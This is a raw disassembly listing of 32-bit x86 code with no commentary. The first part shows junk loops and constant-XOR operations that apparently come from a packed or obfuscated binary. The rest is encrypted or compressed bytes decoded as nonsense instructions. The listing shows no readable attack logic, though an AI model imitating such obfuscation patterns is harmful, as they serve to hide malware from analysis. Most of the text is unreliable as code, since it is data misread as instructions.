  41b9b3:	sub    ecx,DWORD PTR [ecx+esi*1]
  41b9b6:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  41b9bd:	lea    eax,[ebp+0x14]
  41b9c0:	and    DWORD PTR ds:0x428eb3,0x0
  41b9ca:	mov    esi,DWORD PTR ds:0x428eb3
  41b9d0:	inc    esi
  41b9d1:	mov    DWORD PTR ds:0x428eb3,esi
  41b9d7:	cmp    DWORD PTR ds:0x428eb3,0x6
  41b9de:	jg     0x41ba1e
  41b9e4:	jmp    0x41b9f7
  41b9e9:	push   0x428e6b
  41b9ee:	push   DWORD PTR [ebp-0x20]
  41b9f1:	call   DWORD PTR ds:0x42a9ef
  41b9f7:	cmp    DWORD PTR ds:0x428eb3,0x5
  41b9fe:	jne    0x41ba11
  41ba04:	mov    esi,DWORD PTR ds:0x428eb3
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x428eb3,esi
  41ba11:	cmp    DWORD PTR ds:0x428eb3,0x1f
  41ba18:	jb     0x41b9ca
  41ba1e:	mov    DWORD PTR [ebp-0x4],eax
  41ba21:	sbb    edx,DWORD PTR ds:0x428ec7
  41ba27:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  41ba2e:	mov    DWORD PTR ds:0x428e2f,0x1d
  41ba38:	cmp    DWORD PTR ds:0x428e2f,0x0
  41ba3f:	je     0x41ba75
  41ba45:	cmp    DWORD PTR ds:0x428e2f,0x26
  41ba4c:	jle    0x41ba75
  41ba52:	jmp    0x41ba63
  41ba57:	push   DWORD PTR [ebp-0x24]
  41ba5a:	push   DWORD PTR [ebp-0x28]
  41ba5d:	call   DWORD PTR ds:0x42a9f3
  41ba63:	mov    ecx,DWORD PTR ds:0x428e2f
  41ba69:	dec    ecx
  41ba6a:	mov    DWORD PTR ds:0x428e2f,ecx
  41ba70:	jmp    0x41ba38
  41ba75:	lea    eax,[ebp-0xc]
  41ba78:	and    DWORD PTR ds:0x428e5b,0x0
  41ba82:	jmp    0x41ba94
  41ba87:	mov    ecx,DWORD PTR ds:0x428e5b
  41ba8d:	inc    ecx
  41ba8e:	mov    DWORD PTR ds:0x428e5b,ecx
  41ba94:	cmp    DWORD PTR ds:0x428e5b,0x1d
  41ba9b:	jae    0x41bac3
  41baa1:	cmp    DWORD PTR ds:0x428e5b,0x2b
  41baa8:	jge    0x41bac3
  41baae:	jmp    0x41babe
  41bab3:	push   0x428e2f
  41bab8:	call   DWORD PTR ds:0x42a9f7
  41babe:	jmp    0x41ba87
  41bac3:	mov    DWORD PTR [ebp-0x14],eax
  41bac6:	mov    eax,DWORD PTR [ebp-0xc]
  41bac9:	mov    esi,DWORD PTR ds:0x428e33
  41bacf:	or     DWORD PTR ds:0x428e6b,esi
  41bad5:	mov    edx,DWORD PTR [ebp-0x14]
  41bad8:	and    DWORD PTR ds:0x428e77,0x0
  41bae2:	jmp    0x41baf4
  41bae7:	mov    ecx,DWORD PTR ds:0x428e77
  41baed:	inc    ecx
  41baee:	mov    DWORD PTR ds:0x428e77,ecx
  41baf4:	cmp    DWORD PTR ds:0x428e77,0x19
  41bafb:	jae    0x41bb3b
  41bb01:	cmp    DWORD PTR ds:0x428e77,0x9
  41bb08:	jle    0x41bb3b
  41bb0e:	jmp    0x41bb1c
  41bb13:	push   DWORD PTR [ebp-0x28]
  41bb16:	call   DWORD PTR ds:0x42a9fb
  41bb1c:	cmp    DWORD PTR ds:0x428e77,0x8
  41bb23:	jne    0x41bb36
  41bb29:	mov    ecx,DWORD PTR ds:0x428e77
  41bb2f:	inc    ecx
  41bb30:	mov    DWORD PTR ds:0x428e77,ecx
  41bb36:	jmp    0x41bae7
  41bb3b:	mov    ecx,0x75108af
  41bb40:	mov    esi,DWORD PTR ds:0x428e33
  41bb46:	add    DWORD PTR ds:0x428e47,esi
  41bb4c:	xor    eax,ecx
  41bb4e:	sub    DWORD PTR ds:0x428e6f,0x2684
  41bb58:	add    eax,0x3272f6
  41bb5d:	mov    DWORD PTR [edx],eax
  41bb5f:	sbb    eax,eax
  41bb61:	mov    eax,ds:0x4281eb
  41bb66:	mov    DWORD PTR ds:0x428e8b,0x1a
  41bb70:	cmp    DWORD PTR ds:0x428e8b,0x0
  41bb77:	je     0x41bbcc
  41bb7d:	cmp    DWORD PTR ds:0x428e8b,0xd
  41bb84:	jge    0x41bbcc
  41bb8a:	jmp    0x41bba0
  41bb8f:	push   DWORD PTR [ebp-0x18]
  41bb92:	push   0x428eab
  41bb97:	push   DWORD PTR [ebp-0x10]
  41bb9a:	call   DWORD PTR ds:0x42a9ff
  41bba0:	cmp    DWORD PTR ds:0x428e8b,0xe
  41bba7:	jne    0x41bbba
  41bbad:	mov    edx,DWORD PTR ds:0x428e8b
  41bbb3:	dec    edx
  41bbb4:	mov    DWORD PTR ds:0x428e8b,edx
  41bbba:	mov    edx,DWORD PTR ds:0x428e8b
  41bbc0:	dec    edx
  41bbc1:	mov    DWORD PTR ds:0x428e8b,edx
  41bbc7:	jmp    0x41bb70
  41bbcc:	mov    edx,DWORD PTR [ebp-0x4]
  41bbcf:	or     esi,0x7d03
  41bbd5:	mov    eax,DWORD PTR [eax]
  41bbd7:	mov    DWORD PTR ds:0x428ebf,0x12
  41bbe1:	cmp    DWORD PTR ds:0x428ebf,0x0
  41bbe8:	je     0x41bc1d
  41bbee:	cmp    DWORD PTR ds:0x428ebf,0x18
  41bbf5:	jl     0x41bc1d
  41bbfb:	jmp    0x41bc0b
  41bc00:	push   0x428000
  41bc05:	call   DWORD PTR ds:0x42a9cb
  41bc0b:	mov    esi,DWORD PTR ds:0x428ebf
  41bc11:	dec    esi
  41bc12:	mov    DWORD PTR ds:0x428ebf,esi
  41bc18:	jmp    0x41bbe1
  41bc1d:	add    eax,DWORD PTR [edx]
  41bc1f:	mov    DWORD PTR [ebp-0x8],eax
  41bc22:	mov    esi,DWORD PTR [ebp+0x8]
  41bc25:	mov    eax,ds:0x428373
  41bc2a:	and    DWORD PTR ds:0x428e33,0x0
  41bc34:	jmp    0x41bc46
  41bc39:	mov    edx,DWORD PTR ds:0x428e33
  41bc3f:	inc    edx
  41bc40:	mov    DWORD PTR ds:0x428e33,edx
  41bc46:	cmp    DWORD PTR ds:0x428e33,0x1c
  41bc4d:	jae    0x41bc8f
  41bc53:	cmp    DWORD PTR ds:0x428e33,0x8
  41bc5a:	jbe    0x41bc8f
  41bc60:	jmp    0x41bc70
  41bc65:	push   0x428189
  41bc6a:	call   DWORD PTR ds:0x42a9cf
  41bc70:	cmp    DWORD PTR ds:0x428e33,0x7
  41bc77:	jne    0x41bc8a
  41bc7d:	mov    edx,DWORD PTR ds:0x428e33
  41bc83:	inc    edx
  41bc84:	mov    DWORD PTR ds:0x428e33,edx
  41bc8a:	jmp    0x41bc39
  41bc8f:	mov    eax,DWORD PTR [eax+0x198]
  41bc95:	and    DWORD PTR ds:0x428eaf,0x0
  41bc9f:	mov    edx,DWORD PTR ds:0x428eaf
  41bca5:	inc    edx
  41bca6:	mov    DWORD PTR ds:0x428eaf,edx
  41bcac:	cmp    DWORD PTR ds:0x428eaf,0x19
  41bcb3:	jbe    0x41bcd6
  41bcb9:	jmp    0x41bcc9
  41bcbe:	push   0x5031
  41bcc3:	call   DWORD PTR ds:0x42a9d3
  41bcc9:	cmp    DWORD PTR ds:0x428eaf,0x10
  41bcd0:	jb     0x41bc9f
  41bcd6:	xor    esi,ecx
  41bcd8:	mov    edx,0x3272f6
  41bcdd:	add    esi,edx
  41bcdf:	mov    DWORD PTR ds:0x428e7f,0x53fd
  41bce9:	cmp    DWORD PTR [eax],esi
  41bceb:	mov    DWORD PTR ds:0x428e27,0x6856
  41bcf5:	je     0x41bd16
  41bcfb:	mov    DWORD PTR ds:0x428e6f,0x6d53
  41bd05:	mov    eax,DWORD PTR [eax]
  41bd07:	mov    DWORD PTR ds:0x428e5f,0xa8d
  41bd11:	jmp    0x420797
  41bd16:	or     DWORD PTR ds:0x428ec7,ecx
  41bd1c:	mov    eax,DWORD PTR [ebp+0x18]
  41bd1f:	mov    esi,DWORD PTR ds:0x428e47
  41bd25:	adc    esi,DWORD PTR ds:0x428eb3
  41bd2b:	mov    DWORD PTR ds:0x428e47,esi
  41bd31:	mov    esi,DWORD PTR [ebp+0x1c]
  41bd34:	add    DWORD PTR ds:0x428e7f,0x428e53
  41bd3e:	or     ebx,0xffffffff
  41bd41:	jmp    0x41e0ba
  41bd46:	scas   al,BYTE PTR es:[edi]
  41bd47:	fwait
  41bd48:	or     ah,BYTE PTR [esi+eax*1-0x1c]
  41bd4c:	mov    WORD PTR [ecx-0x36abec4b],ds
  41bd52:	add    bl,BYTE PTR [edi+eax*8]
  41bd55:	mov    bh,0x27
  41bd57:	std    
  41bd58:	add    BYTE PTR [ebx-0x7c7c9fd9],0xa8
  41bd5f:	ret    
  41bd60:	test   eax,0xa0de1169
  41bd65:	add    al,0x60
  41bd67:	jae    0x41bd56
  41bd69:	mov    ebx,edi
  41bd6b:	in     eax,dx
  41bd6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd6d:	fcomp  DWORD PTR [ecx+0x6f]
  41bd70:	mov    dl,0x51
  41bd72:	and    edx,eax
  41bd74:	ja     0x41bda7
  41bd76:	pop    ebp
  41bd77:	arpl   WORD PTR [edx+edi*1+0x55dfd767],bx
  41bd7e:	jmp    0xb9ed:0xcfd516aa
  41bd85:	mov    al,ds:0xaf82c1e7
  41bd8a:	aam    0xd2
  41bd8c:	stc    
  41bd8d:	mov    al,ds:0x97bf2030
  41bd92:	push   eax
  41bd93:	cmp    ah,0x6d
  41bd96:	adc    al,0xa0
  41bd98:	call   0xa328069d
  41bd9d:	dec    ecx
  41bd9e:	pop    eax
  41bda0:	add    eax,0x7c6e82ae
  41bda5:	xor    ch,ch
  41bda7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bda8:	in     al,0x1b
  41bdaa:	push   edx
  41bdab:	push   cs
  41bdac:	(bad)  
  41bdad:	aam    0xc9
  41bdaf:	mov    dl,0xf0
  41bdb1:	pop    edi
  41bdb2:	frstor [ecx]
  41bdb4:	lods   eax,DWORD PTR ds:[esi]
  41bdb5:	adc    edx,DWORD PTR [edi]
  41bdb7:	pop    esi
  41bdb8:	repz shl BYTE PTR [eax],0xa
  41bdbc:	mov    eax,0x7394515b
  41bdc1:	cli    
  41bdc2:	(bad)  
  41bdc4:	mov    esp,0xbd3cb1cf
  41bdc9:	jmp    0x41bdc6
  41bdcb:	icebp  
  41bdcc:	pop    ss
  41bdcd:	mov    ah,0x8d
  41bdcf:	or     BYTE PTR [ecx*4-0x27b30d26],ah
  41bdd6:	repz popa 
  41bdd8:	add    al,0x66
  41bdda:	mov    DWORD PTR [ebx+0x55],ebx
  41bddd:	mov    ds:0x3cdcd18c,eax
  41bde2:	addr16 mov edi,0xf9a159c0
  41bde8:	sub    ebx,ebp
  41bdea:	iret   
  41bdeb:	pop    edi
  41bdec:	fiadd  DWORD PTR [esi]
  41bdee:	push   esp
  41bdef:	push   eax
  41bdf0:	push   edx
  41bdf1:	sbb    eax,0xd9cd3a11
  41bdf6:	pop    ecx
  41bdf7:	mov    dl,0xfd
  41bdf9:	push   eax
  41bdfa:	jns    0x41bd8e
  41bdfc:	or     dl,BYTE PTR [ecx-0x72]
  41bdff:	dec    esi
  41be00:	mov    esp,0xd4191d23
  41be05:	sub    cl,bl
  41be07:	retf   
  41be08:	test   al,0xb7
  41be0a:	sub    BYTE PTR [ebx+0xb],bl
  41be0d:	jg     0x41be00
  41be0f:	icebp  
  41be10:	outs   dx,DWORD PTR ds:[si]
  41be12:	mov    bl,0xee
  41be14:	add    al,0xeb
  41be16:	pop    esp
  41be17:	jl     0x41be8a
  41be19:	out    0x21,al
  41be1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be1c:	xchg   edx,eax
  41be1d:	cmp    BYTE PTR [edi+0x7d1ebc80],dh
  41be23:	sbb    DWORD PTR [ebp+0x592f4e13],ecx
  41be29:	mov    BYTE PTR [esi],bh
  41be2b:	jae    0x41bddc
  41be2d:	dec    edi
  41be2e:	into   
  41be2f:	retf   
  41be30:	xor    al,0x1b
  41be32:	mov    ds,WORD PTR [esi-0x73]
  41be35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be36:	mov    cl,bh
  41be38:	mov    al,0xf9
  41be3a:	out    dx,al
  41be3b:	and    DWORD PTR [edx],0x54
  41be3e:	mov    edi,0x18359939
  41be43:	jecxz  0x41be63
  41be45:	pop    esi
  41be46:	mov    ds:0x729c088a,al
  41be4b:	push   cs
  41be4c:	xor    esp,DWORD PTR [ecx+ebp*4-0x6af33cc4]
  41be53:	mov    ebp,0xe781cec7
  41be58:	fucomi st,st(6)
  41be5a:	pusha  
  41be5b:	jg     0x41bed3
  41be5d:	repz jnp 0x41bdef
  41be60:	cmp    ch,cl
  41be62:	mov    ecx,ebp
  41be64:	in     al,0xcb
  41be66:	jnp    0x41bebc
  41be68:	adc    eax,0x75052aa0
  41be6d:	fs dec ebp
  41be6f:	or     ah,0x9e
  41be72:	adc    eax,0x3fbb0474
  41be77:	push   edx
  41be78:	retf   
  41be79:	xchg   BYTE PTR [edx+0x6b],dh
  41be7c:	adc    ch,BYTE PTR [edx+0x189d0182]
  41be82:	pop    esi
  41be83:	(bad)  
  41be84:	ss test eax,0x3a8f94af
  41be8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be8b:	xchg   esp,eax
  41be8c:	and    DWORD PTR [edi+0x60],ebp
  41be8f:	ret    
  41be90:	pushf  
  41be91:	add    al,0x2
  41be93:	test   al,0xa4
  41be95:	call   0x7841b072
  41be9a:	addr16 std 
  41be9c:	mov    bh,0x94
  41be9e:	push   ebp
  41be9f:	retf   
  41bea0:	add    al,0xe8
  41bea2:	push   0x9dddc276
  41bea7:	test   eax,0xca116f02
  41beac:	(bad)
  41beb1:	inc    edi
  41beb2:	sbb    edx,DWORD PTR [esi+0x43]
  41beb5:	xchg   ecx,eax
  41beb6:	mov    edx,0x11931389
  41bebb:	cli    
  41bebc:	lods   eax,DWORD PTR ds:[esi]
  41bebd:	inc    ecx
  41bebe:	jg     0x41be9f
  41bec0:	lods   al,BYTE PTR ds:[esi]
  41bec1:	stos   BYTE PTR es:[edi],al
  41bec2:	out    dx,al
  41bec3:	dec    edi
  41bec4:	jp     0x41be88
  41bec6:	mov    eax,ds:0x55ca6fcf
  41becb:	sbb    al,0x8a
  41becd:	dec    ecx
  41bece:	lahf   
  41becf:	mov    fs,WORD PTR [ebp-0x1d25a321]
  41bed5:	aaa    
  41bed6:	jno    0x41be84
  41bed8:	jmp    0x41bee9
  41beda:	sub    DWORD PTR [edx],ecx
  41bedc:	jae    0x41bf44
  41bede:	int    0xb6
  41bee0:	xchg   ebx,eax
  41bee1:	hlt    
  41bee2:	dec    edi
  41bee3:	imul   esi,DWORD PTR [ecx+ecx*8],0x75
  41bee7:	jmp    0x41bf3e
  41bee9:	test   DWORD PTR [ecx+ebx*1+0x23],esp
  41beed:	ss call 0x86ccb045
  41bef3:	test   BYTE PTR [eax],ch
  41bef5:	fst    DWORD PTR [ebx-0x7ba5436d]
  41befb:	inc    ebx
  41befc:	mov    ds:0x52e6a478,eax
  41bf01:	cdq    
  41bf02:	jp     0x41bf24
  41bf04:	ja     0x41bf3c
  41bf06:	out    dx,eax
  41bf07:	scas   eax,DWORD PTR es:[edi]
  41bf08:	lods   eax,DWORD PTR ds:[esi]
  41bf09:	leave  
  41bf0a:	nop
  41bf0b:	shl    BYTE PTR [eax-0x3c],0xc8
  41bf0f:	and    dl,dh
  41bf11:	cs xchg ebp,eax
  41bf13:	repz mov WORD PTR [ebx],?
  41bf16:	std    
  41bf17:	repz or edx,ecx
  41bf1a:	inc    esi
  41bf1b:	mov    ds:0x6d6b90a9,eax
  41bf20:	ins    BYTE PTR es:[edi],dx
  41bf21:	(bad)  
  41bf22:	push   esp
  41bf23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf24:	(bad)  
  41bf25:	bound  esp,QWORD PTR [ecx-0x5e797a5d]
  41bf2b:	add    al,0x15
  41bf2d:	loop   0x41bf4c
  41bf2f:	xor    BYTE PTR [ebp+0x6b],dl
  41bf32:	push   es
  41bf33:	ins    BYTE PTR es:[edi],dx
  41bf34:	mov    esp,0x5a079721
  41bf39:	in     al,dx
  41bf3a:	sub    BYTE PTR [ebx],al
  41bf3c:	mov    WORD PTR [edi-0xc],fs
  41bf3f:	or     DWORD PTR [edx+0x2c],edx
  41bf42:	add    DWORD PTR [edx+0x5b],edi
  41bf45:	cmp    BYTE PTR [esi+0x35b8b31f],bh
  41bf4b:	inc    ecx
  41bf4c:	add    esi,DWORD PTR [ecx+0x7cc7d2]
  41bf52:	retf   
  41bf53:	aam    0x8d
  41bf55:	inc    edx
  41bf56:	push   edx
  41bf57:	fistp  DWORD PTR [edx-0x3f]
  41bf5a:	aad    0x4c
  41bf5c:	adc    al,0xb2
  41bf5e:	ret    
  41bf5f:	retf   0x3ee1
  41bf62:	inc    ebx
  41bf63:	sub    dh,dl
  41bf65:	scas   al,BYTE PTR es:[edi]
  41bf66:	push   ecx
  41bf67:	fs xchg ebp,eax
  41bf69:	aas    
  41bf6a:	or     bl,BYTE PTR [ebp+0x3a]
  41bf6d:	ja     0x41bf12
  41bf6f:	push   cs
  41bf70:	jae    0x41bf93
  41bf72:	xchg   esp,eax
  41bf73:	push   ebx
  41bf74:	out    dx,al
  41bf75:	xchg   edx,eax
  41bf76:	mov    ch,0x65
  41bf78:	mov    eax,0xd8427f68
  41bf7d:	stos   BYTE PTR es:[edi],al
  41bf7e:	out    dx,eax
  41bf7f:	jp     0x41bf64
  41bf81:	jmp    0xa6e23af0
  41bf86:	xor    dl,dh
  41bf88:	jnp    0x41bfbb
  41bf8a:	lock in al,0xf8
  41bf8d:	in     eax,0x3
  41bf8f:	mov    ch,0x98
  41bf91:	pop    esi
  41bf92:	xor    eax,DWORD PTR [edi]
  41bf94:	dec    ebp
  41bf95:	jo     0x41bfcb
  41bf97:	call   0x9338:0x337fd6da
  41bf9e:	fidiv  DWORD PTR [eax]
  41bfa0:	leave  
  41bfa1:	add    BYTE PTR [esi-0x62],0xcb
  41bfa5:	and    DWORD PTR [esi],0x9f748641
  41bfab:	adc    DWORD PTR [eax+0x51d2099c],eax
  41bfb1:	mov    ch,0xc6
  41bfb3:	push   edx
  41bfb4:	jns    0x41c00b
  41bfb6:	dec    ebx
  41bfb7:	mov    bl,0xaf
  41bfb9:	mov    esp,0xd29def1c
  41bfbe:	loopne 0x41bf5b
  41bfc0:	test   edx,edx
  41bfc2:	aas    
  41bfc3:	ret    
  41bfc4:	test   esp,edi
  41bfc6:	cli    
  41bfc7:	mov    edx,0xdd875b2a
  41bfcc:	mov    al,BYTE PTR [esi+0x6e1826a]
  41bfd2:	mov    edi,0xbeff7182
  41bfd7:	mov    DWORD PTR [ebx-0x19b4c26f],ebx
  41bfdd:	xchg   ebx,eax
  41bfde:	cwde   
  41bfdf:	lea    edx,[ebx-0x23]
  41bfe2:	mov    DWORD PTR [edi+0x55094933],esp
  41bfe8:	pop    edi
  41bfe9:	push   ss
  41bfea:	and    ch,BYTE PTR [edx]
  41bfec:	(bad)  
  41bfed:	adc    BYTE PTR [ebx+eiz*2+0x56c34532],dh
  41bff4:	dec    ecx
  41bff5:	enter  0xc177,0xc9
  41bff9:	int3   
  41bffa:	add    eax,0xba54c8ea
  41bfff:	or     al,0xbd
  41c001:	out    0x22,eax
  41c003:	test   BYTE PTR [eax+0x60],0x4f
  41c007:	mov    dl,0xa
  41c009:	mov    BYTE PTR [eax],dh
  41c00b:	jmp    0xcf8e8e3c
  41c010:	out    0x38,eax
  41c012:	pop    esi
  41c013:	icebp  
  41c014:	jnp    0x41c03e
  41c016:	sbb    DWORD PTR [esi-0x9],edx
  41c019:	cmp    BYTE PTR [edi],ah
  41c01b:	stos   DWORD PTR es:[edi],eax
  41c01c:	fld    DWORD PTR [edx-0x5774f3fe]
  41c022:	inc    esp
  41c023:	pop    edi
  41c024:	xlat   BYTE PTR ds:[ebx]
  41c025:	enter  0xba58,0xc
  41c029:	add    ch,BYTE PTR [ecx-0x1d]
  41c02c:	push   cs
  41c02d:	sub    eax,0x2f4ee47d
  41c032:	(bad)  
  41c033:	lods   al,BYTE PTR ds:[esi]
  41c034:	int3   
  41c035:	imul   esp,esp,0x69aee729
  41c03b:	sti    
  41c03c:	pop    eax
  41c03d:	bound  edi,QWORD PTR [ebx-0x6e9e8af5]
  41c043:	xlat   BYTE PTR ds:[ebx]
  41c044:	sahf   
  41c045:	int    0xb5
  41c047:	(bad)  
  41c049:	jecxz  0x41c055
  41c04b:	loopne 0x41c098
  41c04d:	outs   dx,DWORD PTR ds:[esi]
  41c04e:	xchg   ebx,eax
  41c04f:	xchg   DWORD PTR [edi+0x3e],eax
  41c052:	sub    BYTE PTR ds:0x52f94432,bl
  41c058:	pop    ecx
  41c059:	fimul  WORD PTR [edi+0x39bbc290]
  41c05f:	xor    BYTE PTR [edx],dh
  41c061:	mov    ds:0xa29cd75,eax
  41c066:	ficom  WORD PTR [edi-0x28]
  41c069:	or     DWORD PTR [edx+ebp*2],0x16
  41c06d:	push   0x220c3836
  41c072:	inc    esi
  41c073:	in     eax,0xd9
  41c075:	cmp    al,0x46
  41c077:	(bad)  
  41c078:	stc    
  41c079:	sub    eax,0x392ee932
  41c07e:	lock lock scas al,BYTE PTR es:[edi]
  41c081:	jno    0x41c041
  41c083:	jl     0x41c034
  41c085:	popf   
  41c086:	addr16 or eax,0x73f8bc5
  41c08c:	jae    0x41c03f
  41c08e:	cmc    
  41c08f:	pusha  
  41c090:	and    ah,al
  41c092:	cs ins BYTE PTR es:[edi],dx
  41c094:	das    
  41c095:	rol    ecx,1
  41c097:	jae    0x41c068
  41c099:	jp     0x41c0c4
  41c09b:	inc    eax
  41c09c:	ret    0x7c7f
  41c09f:	adc    ch,dh
  41c0a1:	ja     0x41c0ee
  41c0a3:	dec    esp
  41c0a4:	add    ah,0x30
  41c0a7:	mov    ebp,DWORD PTR [edi]
  41c0a9:	sbb    al,0x6c
  41c0ab:	int    0x58
  41c0ad:	mov    ch,0x92
  41c0af:	and    BYTE PTR [ebp-0x638d34b1],ah
  41c0b5:	aad    0x93
  41c0b7:	mov    ds:0x3f584469,eax
  41c0bc:	stc    
  41c0bd:	push   cs
  41c0be:	repz cwde 
  41c0c0:	pop    ds
  41c0c1:	adc    al,0xc4
  41c0c3:	mov    BYTE PTR [ecx],cl
  41c0c5:	cwde   
  41c0c6:	adc    eax,0xde840a37
  41c0cb:	int3   
  41c0cc:	mov    cl,0xdd
  41c0ce:	jb     0x41c0ba
  41c0d0:	mov    edx,0x3c34aa65
  41c0d5:	xchg   ecx,eax
  41c0d6:	pop    eax
  41c0d7:	sub    eax,0xe647f6ac
  41c0dc:	ss dec edx
  41c0de:	mov    ecx,0x9e0226a8
  41c0e3:	(bad)  
  41c0e4:	xchg   esp,eax
  41c0e5:	xor    eax,ecx
  41c0e7:	xchg   edx,eax
  41c0e8:	xchg   ebx,eax
  41c0ea:	adc    edx,edi
  41c0ec:	pop    esp
  41c0ed:	mov    ecx,DWORD PTR [ebx+0x50]
  41c0f0:	pop    ebx
  41c0f1:	(bad)  
  41c0f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0f3:	add    esi,DWORD PTR [ebx-0x25c238c2]
  41c0f9:	fadd   st(7),st
  41c0fb:	ja     0x41c08e
  41c0fd:	pop    ecx
  41c0fe:	(bad)  
  41c0ff:	bound  ebp,QWORD PTR [ecx+0xd0d3457]
  41c105:	xchg   dx,ax
  41c107:	(bad)  
  41c108:	clc    
  41c109:	sub    BYTE PTR gs:[edi],bh
  41c10c:	iret   
  41c10d:	xlat   BYTE PTR ds:[ebx]
  41c10e:	lods   al,BYTE PTR ds:[esi]
  41c10f:	push   ebp
  41c110:	repnz loopne 0x41c094
  41c113:	icebp  
  41c114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c115:	xchg   esi,eax
  41c116:	repz jmp 0xc0a2e43e
  41c11c:	nop
  41c11d:	mov    dh,0x89
  41c11f:	out    dx,al
  41c120:	out    dx,al
  41c121:	dec    edi
  41c122:	jno    0x41c195
  41c124:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c125:	jge    0x41c143
  41c127:	test   al,0x60
  41c129:	sub    DWORD PTR [esi-0xc],ebx
  41c12c:	in     al,dx
  41c12d:	loop   0x41c193
  41c12f:	cwde   
  41c130:	mov    edi,0x1c53cb67
  41c135:	or     DWORD PTR [edx+0x22],eax
  41c138:	inc    ebx
  41c139:	push   0xc6defe6f
  41c13e:	imul   esp,eax,0x76b7c467
  41c144:	push   ebp
  41c145:	jb     0x41c18e
  41c147:	(bad)  
  41c148:	adc    eax,0xff11b156
  41c14d:	pushf  
  41c14e:	push   0xee4c781e
  41c153:	xchg   ecx,eax
  41c154:	mov    dh,0x92
  41c156:	arpl   WORD PTR [edi],bp
  41c158:	ins    BYTE PTR es:[edi],dx
  41c159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c15a:	dec    edx
  41c15b:	push   cs
  41c15c:	rcl    eax,cl
  41c15e:	adc    edx,esp
  41c160:	sbb    al,0x3b
  41c162:	les    esp,FWORD PTR [edi+0x61]
  41c165:	sbb    BYTE PTR [esi+0x3f],0x28
  41c169:	scas   eax,DWORD PTR es:[edi]
  41c16a:	into   
  41c16b:	jns    0x41c166
  41c16d:	mov    eax,ds:0xb3f750d1
  41c172:	inc    ebp
  41c173:	mov    ch,0x61
  41c175:	cmp    BYTE PTR [edi-0x6a611941],0x2a
  41c17c:	clc    
  41c17d:	cmp    bl,bl
  41c17f:	or     edx,DWORD PTR [eax+edx*8]
  41c182:	adc    eax,edx
  41c184:	pop    edx
  41c185:	ret    
  41c186:	in     eax,0x96
  41c188:	jl     0x41c18e
  41c18a:	adc    al,0x72
  41c18c:	xchg   ecx,eax
  41c18d:	push   ecx
  41c18e:	add    al,BYTE PTR ds:0x56b1d305
  41c194:	xchg   edi,eax
  41c195:	jle    0x41c1fb
  41c197:	mov    ds:0xfd5e4df0,al
  41c19c:	sub    al,BYTE PTR [ebp-0x31]
  41c19f:	adc    esp,edx
  41c1a1:	and    BYTE PTR [ebx-0x66],0xda
  41c1a5:	gs pop edi
  41c1a7:	call   0x7c61:0xea1ffd40
  41c1ae:	je     0x41c163
  41c1b0:	fisubr WORD PTR [edx]
  41c1b2:	iret   
  41c1b3:	inc    esp
  41c1b4:	push   edi
  41c1b5:	scas   eax,DWORD PTR es:[edi]
  41c1b6:	fsub   DWORD PTR [esi+edx*2]
  41c1b9:	inc    edx
  41c1ba:	pop    ecx
  41c1bb:	push   cs
  41c1bc:	(bad)  
  41c1bd:	mov    al,ds:0x2f46c630
  41c1c2:	cld    
  41c1c3:	adc    bl,BYTE PTR [eax]
  41c1c5:	mov    esi,0x727aba29
  41c1ca:	je     0x41c1d5
  41c1cc:	ret    0x661f
  41c1cf:	loope  0x41c240
  41c1d1:	outs   dx,BYTE PTR ds:[esi]
  41c1d2:	shr    ah,0xed
  41c1d5:	mov    eax,0x7ea551fb
  41c1da:	aas    
  41c1db:	ret    
  41c1dc:	std    
  41c1dd:	lahf   
  41c1de:	mov    edx,0x6f5a9911
  41c1e3:	jg     0x41c189
  41c1e5:	add    BYTE PTR [edx+0x36],cl
  41c1e8:	jbe    0x41c1f3
  41c1ea:	les    ecx,FWORD PTR [ebp+0x4]
  41c1ed:	inc    esp
  41c1ee:	(bad)  
  41c1ef:	test   eax,0xeb61f3e4
  41c1f4:	call   0xba054a9e
  41c1f9:	pop    ss
  41c1fa:	(bad)  
  41c1fb:	inc    DWORD PTR [ecx+0x52b2ee62]
  41c201:	mov    al,ds:0x939c3d9f
  41c206:	out    dx,al
  41c207:	sub    ch,BYTE PTR [eax-0x21]
  41c20a:	dec    ecx
  41c20b:	jl     0x41c1d3
  41c20d:	or     al,BYTE PTR [eax-0x74]
  41c210:	es int3 
  41c212:	xchg   ebp,eax
  41c213:	daa    
  41c214:	out    0x48,eax
  41c216:	in     eax,0x2b
  41c218:	push   edi
  41c219:	ins    DWORD PTR es:[edi],dx
  41c21a:	cmp    BYTE PTR [esi+0x22],bl
  41c21d:	nop
  41c21e:	aad    0x63
  41c220:	fsub   DWORD PTR [eax-0x26e0e043]
  41c226:	pushf  
  41c227:	xor    esi,esi
  41c229:	dec    esp
  41c22a:	jmp    0x41c1fe
  41c22c:	add    eax,0x6668c0ba
  41c231:	sbb    edi,DWORD PTR [ebx-0x2da7f25d]
  41c237:	int3   
  41c238:	retf   
  41c239:	(bad)  
  41c23b:	dec    ecx
  41c23c:	mov    edi,0xb1c59a78
  41c241:	pop    edx
  41c242:	(bad)  
  41c244:	sbb    dl,bh
  41c246:	xor    bh,BYTE PTR [ebx-0x38d64f4f]
  41c24c:	in     al,dx
  41c24d:	stc    
  41c24e:	sbb    ebp,DWORD PTR [edx]
  41c250:	jg     0x41c263
  41c252:	clc    
  41c253:	sub    dl,BYTE PTR [edi-0x44]
  41c256:	mov    eax,ds:0x8528ee01
  41c25b:	rcr    BYTE PTR [eax-0x5f],1
  41c25e:	sub    BYTE PTR [edx],dl
  41c260:	mov    ds:0x28d09b0e,eax
  41c265:	stos   DWORD PTR es:[edi],eax
  41c266:	vpperm xmm1,xmm2,XMMWORD PTR [esi],xmm4
  41c26c:	mov    edi,0x523c3a6
  41c271:	sbb    DWORD PTR [edx],0x25
  41c274:	mov    eax,0x7770d85
  41c279:	and    BYTE PTR [eax-0x12],dh
